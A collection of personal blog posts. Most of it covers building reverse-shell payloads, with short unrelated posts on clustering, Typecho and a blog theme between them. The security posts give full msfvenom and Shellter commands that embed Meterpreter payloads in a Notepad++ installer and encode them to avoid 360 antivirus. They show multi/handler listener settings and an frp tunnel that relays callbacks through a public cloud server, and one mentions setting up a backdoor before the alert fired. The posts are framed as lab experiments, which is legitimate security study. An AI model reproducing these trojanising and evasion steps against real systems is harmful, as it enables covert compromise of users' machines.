text: # Unsupervised learning Unsupervised learning groups observations without being given labelled training examples. Advantages The algorithm can pick up patterns that the original choice of labels might have obscured. Data does not need to be labelled, which can greatly expand the available sample. Common applications include cluster analysis, association rules and dimensionality reduction. # Cluster analysis Cluster analysis groups objects according to how similar they are on selected attributes. # K-means Each cluster has a centre. An observation belongs to the cluster whose centre is closest to it. Start with observations x1,x2,…,xkx_1,x_2,\dots,x_kx1​,x2​,…,xk​ and cluster centres u1,u2,…,umu_1,u_2,\dots,u_mu1​,u2​,…,um​. Initialise the centres by choosing observations at random. Compute the distance dis(xi,uj)dis(x_i,u_j)dis(xi​,uj​) from each observation to each centre and assign it to the nearest one. Move each centre to the mean of the observations assigned to its cluster: uj=1∣sj∣∑xi∈sjxiu_j=\frac{1}{|s_j|}\sum_{x_i\in s_j}x_iuj​=∣sj​∣1​∑xi​∈sj​​xi​, where ∣sj∣|s_j|∣sj​∣ counts the observations in cluster jjj. Repeat until the assignments and centres settle. K-means is simple to implement and often converges quickly. You have to specify the number of clusters, and different initial centres can produce different results. # KNN The k-nearest neighbours classifier uses supervised learning. For a new observation: Find its k nearest neighbours in the training set. Assign the class that occurs most often among those neighbours. # Mean-shift Mean-shift looks for cluster centres by moving towards regions of higher density. Choose an observation at random as the starting centre uuu. Let shs_hsh​ contain the kkk observations within radius rrr of that centre. For each point in the neighbourhood, take its displacement from the centre to the point. The mean displacement is M(x)=1k∑xi∈sh(xi−u)M(x)=\frac{1}{k}\sum_{x_i\in s_h}(x_i-u)M(x)=k1​∑xi​∈sh​​(xi​−u). Add the displacement to the current centre: u=u+M(x)u=u+M(x)u=u+M(x). Repeat until the centre settles. You choose the neighbourhood radius (the bandwidth). There is no need to specify the number of clusters up front. # DBSCAN DBSCAN groups observations by local density. Identify points with a sufficiently dense neighbourhood. Expand each cluster outwards from its core points until no further points can be added. DBSCAN can mark isolated observations as noise and does not require a predefined number of clusters. Results depend on how much the density varies across the dataset.

title: Setting Up a Remote Metasploit Lab with frp
text: I configured frp between a cloud server and a Kali VM. I tested the connection with SSH first, then used the tunnel in the Metasploit lab. I used frp 0.41.0, an Ubuntu 18.04.6 cloud server and a Kali Linux 2022 VM. The configuration examples use the INI format from that release. For a different release, check its own documentation. # Preparation The server running frps needs a public IP address. The machine running frpc needs outbound network access. In this setup: frps: Ubuntu 18.04.6 cloud server. frpc: Kali Linux 2022 guest. Project: fatedier/frp. # frps (cloud server) # Download and install I downloaded the Linux amd64 package from the 0.41.0 release. The screenshots show that version. Download the archive in a terminal on the cloud server: wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz Extract it: tar -zxvf frp_0.41.0_linux_amd64.tar.gz Change into the extracted directory with cd frp_0.41.0_linux_amd64/ . The archive includes both frps and frpc. In the screenshot I removed the client files from the server directory. That was just housekeeping; leaving them there does not prevent frps from running. # Configure frps The server needs a listening port for the client. I also enabled the optional dashboard to see the connection status. Omit the dashboard settings if you don’t need it. Run vim frps.ini and enter the server settings: [common]bind_port = 7777dashboard_port = 9999dashboard_user = Sycamoredashboard_pwd = 123456The client connects to bind_port . The separate dashboard port serves the monitoring page; its username and password apply to that page. The screenshot shows the weak lab password 123456 . Use your own credentials for an actual deployment. In this example, frpc connects to port 7777 and the dashboard listens on port 9999. Check the cloud security group and host firewall for those ports. Restrict dashboard access to the machines that need it. # Run From the extracted directory, run ./frps -c frps.ini to keep the server in the foreground. Closing the terminal or interrupting the foreground command can stop the process. For a background process I used: nohup ./frps -c frps.ini >/dev/null 2>&1 &This discards output and does not arrange startup after a reboot. I ran the server in the background and managed the client with systemd. # frpc (Kali Virtual Machine) The remaining client installation, configuration and startup steps take place inside Kali. # Download and install Download and extract the same release and enter its directory. The client uses frpc and frpc.ini. There is no need to remove the server files. # Configure frpc The client needs the server address and a description of the service to forward. I used SSH to test connectivity. The section name is my choice; SSH is not a prerequisite for frp. Run vim frpc.ini and enter the client settings: [common]server_addr = 106.15.52.194server_port = 7777[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 6666use_compression = trueThe IP is the cloud server address from my lab. The client’s server_port corresponds to the server’s bind_port. The SSH mapping exposes the guest’s local SSH service on port 6666 of the cloud server. The screenshot also includes the later [msf] mapping. Only the [common] and [ssh] sections apply to this test. # Run Run ./frpc -c frpc.ini in the program directory for foreground operation. To start it on boot, use a systemd unit. My executable and configuration lived in /root/frp/. The paths in the unit must point to their actual locations. This was my /lib/systemd/system/frp.service: [Unit]Description=Frp Client ServiceAfter=network.target remote-fs.target nss-lookup.targetWants=network.target[Service]Type=simpleExecStart=/root/frp/frpc -c /root/frp/frpc.iniRestart=alwaysRestartSec=20s[Install]WantedBy=multi-user.target I used the following commands. The service name frp corresponds to the filename frp.service. Start: systemctl start frp . Enable on boot: systemctl enable frp . Restart: systemctl restart frp . Stop: systemctl stop frp . Inspect status and recent logs: systemctl status frp . # SSH Connection Test With the service running, test SSH through the mapped port on the cloud host. In ssh root@x.x.x.x -p 6666 , substitute the cloud server’s public address. The cloud server is the connection entry point, but the forwarded login is to the Kali guest. Use the guest’s SSH account. Its system information appears after login. For Xshell, create a session using the cloud address and mapped port: Supply the Kali account credentials: Save and connect to reach the Kali terminal: # Metasploit lab test Once SSH was working, I recorded the port settings and screenshots for the Metasploit experiment. I used Kali with a Windows 7 x64 guest as the target. # Additional frpc configuration I added the following settings at the end of frpc.ini : [msf]type = tcplocal_ip = 127.0.0.1local_port = 4444remote_port = 2333 # Test payload generation The incoming connection went through the cloud server, so LHOST and LPORT in my notes refer to its address and mapped port. Here’s the generation command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe > qq.exe # Session listener I kept frps and frpc running and transferred the test file to the Windows 7 x64 guest. This screenshot shows the download from Kali’s Apache2 server: On the listener side I used the following commands: msfconsole opens Metasploit. use exploit/multi/handler selects the handler. set PAYLOAD windows/x64/meterpreter/reverse_tcp selects the payload. set LHOST 127.0.0.1 sets the listening address. set LPORT 4444 sets the local listening port. run starts the listener. Start the listener before running the test file. Here’s the file running on Windows 7: On the listener side I saw a Meterpreter session and a listing of the desktop files:

title: Customising the EasyBe Theme
text: After installing Typecho I tried the EasyBe theme and changed some of its settings. These notes describe the version I used in 2022. The examples refer to this historical revision. The repository has since changed considerably. Check the configuration and third-party integrations in your own version before copying these snippets. # Installing EasyBe I covered Typecho itself in Installing and configuring Typecho. Download the appropriate theme archive from the EasyBe repository, use BT Panel to upload it to usr/themes/ under the Typecho installation and extract it. The files should be in a single theme folder without an extra archive directory around them. Enable it under Control Panel → Appearance. # Configuring EasyBe # A small gripe I enabled the theme and got a blank home page. I suspect that release was still fairly early in development. Other Typecho themes I’d tried at least showed a basic page straight away, so this one threw me. It took me a while to think of opening the appearance settings (￣_￣|||). Once I filled in the configuration from the author’s notes, the page finally appeared. A shaky start, but I quite liked the result. # The settings # Avatar, nickname, occupation and location Fill in your details in the appearance settings and save. They appear at the top of the sidebar. # CNZZ analytics Leave this field blank if you don’t need analytics. The theme accepts a tracking snippet; its original display position was below the footer links. According to Umeng’s announcement, U-Web stopped providing free website analytics on 10 May 2022. This explains the old theme field. If you still want to use the service, check what it offers and get the snippet from your dashboard. # Site filings These fields display filings you have already obtained. ICP filing and public security registration are separate; each number needs its corresponding lookup link. Link an ICP number to the MIIT filing system. Substitute your full number in this example: 你的 ICP 备案号For a public security registration use the display code, registration number and lookup link from the national public security platform. Adding a display snippet doesn’t complete the filing itself. # Global configuration Filling in this section fixed my blank home page. It brings together the avatar, cover images, animations and plenty of other settings. Several image links in the old configuration had expired. This example uses the background and avatar bundled with that revision. Replace them with your own images. Here’s a complete example based on the original. It still uses the default triangular loader. The hexagonal one I made is further down. Paste the example into the global configuration field in the appearance settings, then change the nickname, start date, avatar and links to your own. # Making changes The next sections explain individual fields in the complete example. Replace the corresponding section there instead of pasting a second configuration alongside it. # Global settings # GitHub asset source These three values tell jsDelivr where to find the static files. If you plan to change the scripts or styles, fork the repository and use your own values. GhUserName: the GitHub owner. GhRepositories: the repository name. GhVersions: an existing tag, branch or commit. This example pins a commit; an invented version number won’t resolve. // ---- GitHub文件源配置 ---- GhUserName: 'wangyang0210', GhRepositories: 'EasyBe', GhVersions : '80e8d7f9b7acb7ab1318ac39cbfad7b0ed908edd',# Basic site information blogUser: the name centred on the home cover. blogAvatar: the avatar image URL. blogStartDate: the date used to calculate the site age shown in the footer. // ---- 基础信息配置 ----custom blogUser : "。思索", blogAvatar : "https://cdn.jsdelivr.net/gh/wangyang0210/EasyBe@80e8d7f9b7acb7ab1318ac39cbfad7b0ed908edd/static/imgs/home_top_bg.jpg", blogStartDate : "2019-8-1",# Browser tab webpageTitleOnblur: title shown after switching away. webpageTitleOnblurTimeOut: delay in milliseconds before replacing it. webpageTitleFocus: title shown immediately when returning. webpageTitleFocusTimeOut: delay in milliseconds before restoring the original title. webpageIcon: favicon shown in the tab. // ---- 网站配置 ---- webpageTitleOnblur : "(◍´꒳`◍) Hi, MyFriend", webpageTitleOnblurTimeOut : 500, webpageTitleFocus : "(*´∇｀*) 欢迎回来！", webpageTitleFocusTimeOut : 1000, webpageIcon : "https://files.cnblogs.com/files/wangyang0210/blog_logo.gif", # Progress bar I left this at its default. The theme feeds the scroll percentage to the bar. duration is the width transition time in seconds; 0.2 gives each update a 0.2-second transition. // ---- 进度条配置 ---- progressBar: { id : 'top-progress-bar', color : '#77b6ff', height : '2px', duration: 0.2 },# Loading animation This was the fun part. The default loader is a set of nested triangles, and changing just a few parameters gives it a different look. rebound: the spring parameters. Tension and friction together shape the movement and bounce. radius: radius of the base polygon. sides: number of sides; 3 makes a triangle. depth: number of nested layers. background, stroke, base, child: background, outline, base fill and inner polygon fill colours, respectively. alwaysForward: true keeps it moving forward; false allows back-and-forth movement. restAt: progress threshold. The original comment suggests 0.1 to 0.9, or null for the full interval. It doesn’t take a rotation angle. renderBase: enable to draw the base polygon and use its fill colour. The default settings: // ---- Loading配置 ---- loading: { rebound: { tension: 16, friction: 5 }, spinner: { id: 'spinner', radius: 90, sides: 3, depth: 4, colors: { background: '#f0f0f0', stroke: '#272633', base: null, child: '#272633' }, alwaysForward: true, // When false the spring will reverse normally. restAt: 0.5, // A number from 0.1 to 0.9 || null for full rotation renderBase: false } },My version uses a black background and hexagons with black fill, leaving the yellow outlines visible: loading: { rebound: { tension: 46, friction: 3 }, spinner: { id: 'spinner', radius: 120, sides: 6, depth: 6, colors: { background: '#181818', stroke: '#F4CA0C', base: '#181818', child: '#181818' }, alwaysForward: false, // When false the spring will reverse normally. restAt: 0.2, // A number from 0.1 to 0.9 || null for full rotation renderBase: true } },This is a frame from a reproduction. In motion the hexagons move back and forth. # Home cover I kept the existing page animation because I already liked how it looked. homeTopImg accepts several cover URLs and chooses one at random. I had tried homeBannerTextType to show a Hitokoto quote, without success. Checking the old code showed that it actually reads homeBannerText for a fixed tagline. // ---- 主页配置 ---- homeTopImg : [ "your_image_url" ], homeBannerText: "",# Posts and footer essayTopImg: post covers, randomly chosen when several are supplied. essayCodeHighlightingType and essayCodeHighlighting: highlighting method and palette. I left these alone. If you change them, check that the required highlighter and styles are loaded. aboutHtml and copyrightHtml: the author note and copyright notice above the comments. // ---- 随笔页配置 ---- essayTopImg: [ "https://cdn.jsdelivr.net/gh/wangyang0210/EasyBe@80e8d7f9b7acb7ab1318ac39cbfad7b0ed908edd/static/imgs/home_top_bg.jpg" ], essayCodeHighlightingType: 'highlightjs', // 代码主题插件类型：cnblogs || highlightjs || prettify essayCodeHighlighting: 'monokai-sublime', // 代码高亮主题，具体主题参考文档 essaySuffix:{ // 随笔后缀处配置 aboutHtml : '', // 关于博主，不配置使用默认 copyrightHtml: '', // 版权声明，不配置使用默认 }, In the footer, bottomBlogroll takes pairs of display names and URLs. bottomText sets the tagline. // ---- 页脚配置 ---- bottomBlogroll: [ // 友情链接，[[链接名,链接]....] ["EasyBe 项目", 'https://github.com/wangyang0210/EasyBe'], ], bottomText: { // 页脚标语 icon: "❤️", left: "学无止境", right: "谦卑而行" },consoleList supplies text written to the browser console. The code after it loads scripts and initialises the theme; appearance changes alone don’t require editing that part. # Editing theme files I used Appearance → Edit current theme. Back up the relevant files before editing, so you can recover the page if an edit breaks it. # Playlist in the lower-left corner In footer.php, find the player and set data-id to your NetEase Cloud Music playlist ID. The attributes data-server="netease" and data-type="playlist" select the service and resource type. Open the playlist’s web page and look at the number after id= in its address: # Three headaches At the end of a post, the three links “脑壳疼”, “脑仁疼” and “脑瓜疼” all give you the same “Under development” alert (/▽＼). They live in post.php. To use them for real links, change the text and href and remove the original onclick alert. I found the relevant lines but never decided what should go there, so I haven’t actually changed them on my site. # Sidebar links I quite like the sidebar. Its links are in sidebar.php: Home, Admin and Add post already go to the appropriate pages. For other entries, edit the href and link text. Contact uses a QQ conversation link, with the QQ number following uin= . The screenshots record an older QQ promotion page; I haven’t rechecked whether it can still launch the client today. Open the QQ promotion page and select Promotion tools → Settings. Set conversation permissions and save: When testing, use a different account instead of trying to start a conversation with yourself. Whether the link opens depends on the client and browser. The mobile test I used at the time was only one setup. # Looking back I mostly changed configuration and a few links. My favourite bit is still that loading animation (oﾟvﾟ) ノ.

title: Testing Antivirus Evasion with Metasploit and Shellter
text: Antivirus tested: the 360 security suite. # MSF msfconsole mp_npp (16 April 2022) msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe > mp_npp.exe Listener: use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 192.168.158.139 set LPORT 4444 run Detection results. The quick scan produced no alert. A targeted folder scan flagged the file, and 360 detected it immediately when it ran. VirusTotal reported 40/70 detections. Sample report mp_rc4_npp_i15 (18 April 2022) msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe > mp_rc4_npp_i15.exe Listener: use exploit/multi/handler set payload windows/meterpreter/reverse_tcp_rc4 set LHOST 192.168.158.139 set LPORT 4444 run Detection results. 360’s static scan did not flag this sample, but its runtime protection detected and removed it. VirusTotal reported 38/70 detections. Sample report sh_npp_i27 (18 April 2022) msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe > sh_npp_i27.exe Listener: use exploit/multi/handler set payload windows/shell_reverse_tcp_rc4 set LHOST 192.168.158.139 set LPORT 4444 run Detection results. This sample also passed the static check and was detected during execution. VirusTotal reported 35/69 detections. Sample report # Shellter test shellter_npp (16 April 2022) I chose Shellter’s built-in Meterpreter_Reverse_TCP payload (option 1). Detection results. The static check produced no alert. The runtime warning appeared after about a minute in this test. That gave me enough time to migrate the process and set up a backdoor before the alert appeared. VirusTotal reported 31/70 detections. title: Installing and Configuring Typecho
text: I installed Typecho on a subdomain in my spare time. These notes cover the installation, then how to add themes and plugins. The screenshots and steps come from my 2022 installation of Typecho 1.1. For a new site, download the stable release from the official website and check its server requirements. The archive layout and admin screens may differ from the ones below. # Installing Typecho # Before you start I used the BT Panel again. Have these ready: A domain or subdomain that resolves to the server. A PHP-enabled site and its document root, for example /www/wwwroot/your-domain . A MySQL database for the site. Keep the database name, username and password handy. BT Panel can create the directory and database when you add the site. The relevant steps are in Setting up WordPress with BT Panel. Stop once you’ve added the site; you don’t need to install WordPress. You can upload the package through the panel’s file manager or use your usual file transfer method. # Download the package Get the stable release from the Typecho download page. I originally used Typecho 1.1; that link identifies the version in the screenshots. # Upload and extract Open the site’s document root in the file manager. Choose Upload, select the archive and start the upload. Extract the archive. The release I used produced a folder named build : Open build , select its files and directories, cut them and paste them into the document root. Check that index.php , admin and usr now sit directly under the site root. If visiting the domain still brings up the panel’s welcome page, check whether your server gives the default index.html precedence. Once you’ve confirmed it’s just the placeholder created with the site, move it aside so the server can reach Typecho’s entry point. # Complete the installer Visit the domain you configured. You should see Typecho’s installation wizard: Resolve any server requirement warnings it reports. When the checks pass, click “我准备好了，开始下一步” (“I’m ready, go to the next step”). Enter the database settings and choose a MySQL adapter for a MySQL database. Username, password and database name. Use the values from the database you created in BT Panel. The screenshot’s root and typecho are examples. Database host. This is usually localhost if the site and database share a server. For a remote database, use its actual address. Table prefix. The default typecho_ usually works. If another Typecho installation shares the database, use a different prefix so they don’t write to the same tables. The next section is for the site and its administrator. Those credentials are for the Typecho dashboard and are separate from the database login. Site URL. Check the detected domain, scheme and installation directory. For a site already configured for HTTPS, use its working HTTPS address. Username and password. Choose an administrator username and a strong password and save them. The old version in the screenshot could generate a random password if you left the field blank; in that case you had to record the one shown after installation. Email. Replace the example address with one you use. Click “确认，开始安装” (“Confirm and start installation”). This is the success screen: # Basic configuration On the success page, click “访问您的控制面板” (“Visit your control panel”) to open the dashboard. Under Write, you can create posts and pages using Markdown. Manage lets you manage posts, pages, comments and categories. Adjust your profile as you like. Here I’ll focus on adding plugins and themes. Download the package from the plugin or theme author and check it supports your Typecho release. Upload and extract it in the appropriate directory: Plugins: usr/plugins/ Themes: usr/themes/ Both are relative to the Typecho installation. If your site lives at /www/wwwroot/your-domain , the plugin directory is /www/wwwroot/your-domain/usr/plugins/ . The server’s top-level /usr is a different directory. Each plugin or theme should have a directory of its own, without an extra wrapper directory from the archive. If a plugin requires a particular directory name, follow its author’s instructions. In the dashboard, find the uploaded plugin under Control Panel → Plugins and enable it. For a theme, use Control Panel → Appearance. If it’s missing from the list, check the extraction path and directory nesting first. From there, follow the individual plugin or theme’s configuration instructions.

title: Installing and Using Shellter
text: Shellter modifies executables using dynamic shellcode injection. I recorded how I installed and used it, and what I observed in a Windows 7 VM. I used Shellter 7.2 on Kali Linux and a Windows 7 x64 guest running 360 security software. The results describe this test and its software versions. # Shellter installation I ran Shellter under Wine on Kali. The setup needed i386 support and the corresponding dependencies. The screenshots show a root session. Enable the i386 architecture, refresh the package index and install the Wine dependency: dpkg --add-architecture i386 && apt update && apt -y install wine32 Install Shellter with apt install shellter . # Using Shellter I used automatic mode to inject Meterpreter_Reverse_TCP into the test executable. The following section records the prompts shown by the tool. I entered shellter at the command line to start the tool. I entered A (or a) for automatic mode. At the PE Target prompt I supplied the path to the test executable. I answered Y at the Enable Stealth Mode? prompt. I entered L to use one of the listed payloads. I chose option 1, Meterpreter_Reverse_TCP. I entered the listener’s IP address and port. When the screen showed Injection: Verified! I pressed Enter to finish. The tool replaced the file at the original path without changing its name. In this environment it saved the original under /root/Shellter_Backups/ . # Execution and detection # Execution I transferred the processed file to the Windows 7 x64 guest, opened msfconsole on Kali and used the following settings for the listener: use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 192.168.158.139 set LPORT 4444 run Running the test program resulted in a connection and a Meterpreter session. # Detection results The Windows 7 x64 guest was running 360. There was no warning during the initial file check or immediately after the session opened. The alert below appeared roughly a minute later. That delay did not mean the sample had escaped detection. A repeat encounter seemed to trigger the alert sooner, but this experiment wasn’t enough to establish a typical response time. I also submitted the sample to VirusTotal. In the captured report, 31 of 70 engines flagged it. Report For comparison I tested another sample made from the same host program and payload using the msfvenom template approach. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe > mp_npp.exeThe second report recorded 40 detections out of 70. Report Fewer engines flagged the Shellter sample in these reports. Both samples were detected by multiple engines. This was one experiment with Shellter. A single comparison cannot establish how effective a tool is; engines and their definitions change.

title: Testing Payloads with Metasploit
text: Metasploit is an open-source penetration testing framework used to discover, validate and exploit vulnerabilities. The Kali environment used here came with Metasploit installed. # Generating, embedding and encoding test samples with msfvenom Introduction msfvenom is part of Metasploit. It combines functions previously provided by msfpayload and msfencoder. It can generate a payload, encode it to avoid bad characters or try to evade antivirus detection, and bundle it with a host executable. # Command reference These were the options I used: -l lists the available resources for a module type: payloads, encoders, nops, platforms, archs, encrypt, formats or all. The samples in this lab are under payloads. -p selects a payload. A dash selects a custom payload from standard input. To see a payload’s standard options, use --list-options . -f selects the output format. Run --list formats to see the available formats. -o sets the output file path. Shell redirection is another way to save the output. -x supplies a custom executable template that the payload will be bundled with. -e selects the encoder. -i sets the number of encoding iterations. # Generating a sample I listed the available payloads with msfvenom -l payloads . There were a lot of results, so I used grep to narrow them down by the features I wanted. I used linux/x86/meterpreter/reverse_tcp as an example of a reverse connection. I checked which options that payload needed: msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options I listed the available output formats: msfvenom --list formats Using that information, I put together the command to generate the sample: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf Here, -p selects linux/x86/meterpreter/reverse_tcp. LHOST specifies the IP address of the listener the sample connects back to. LPORT selects the port. Its default is 4444, so I could omit it here. -f sets the output format to elf. -o saves the output to /root/payload.elf. # Embedding a sample A Trojan can be bundled with an ordinary executable to help it spread. For the host file I used /root/hello_world , a small C program I’d compiled with gcc. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf The -x option selects /root/hello_world as the template. The remaining arguments are the same as in the earlier generation command. # Detection testing For this part of the lab I tested whether encoding changed the antivirus result. I listed the available encoders with msfvenom -l encoders . I chose x86/shikata_ga_nai to see whether encoding would make the sample less likely to be detected. My command was msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf . -e selects x86/shikata_ga_nai. -i sets the iteration count to five. The number of iterations is adjustable. Adding more doesn’t necessarily improve the result and can stop the sample working. # Observing a test session in msfconsole The following experiment used the previously generated file payload.elf. # Controller I opened the MSF console with msfconsole . I selected the handler with use exploit/multi/handler . Then I ran show options to see which parameters still needed values. I selected the payload with set PAYLOAD linux/x86/meterpreter/reverse_tcp . I set the local host address with set LHOST 192.168.158.132 . Running run started the listener. When I ran the sample on the target server, the listener received a shell. Here’s the result: # Target server I transferred the sample to the target server. I made it executable with chmod +x payload.elf .
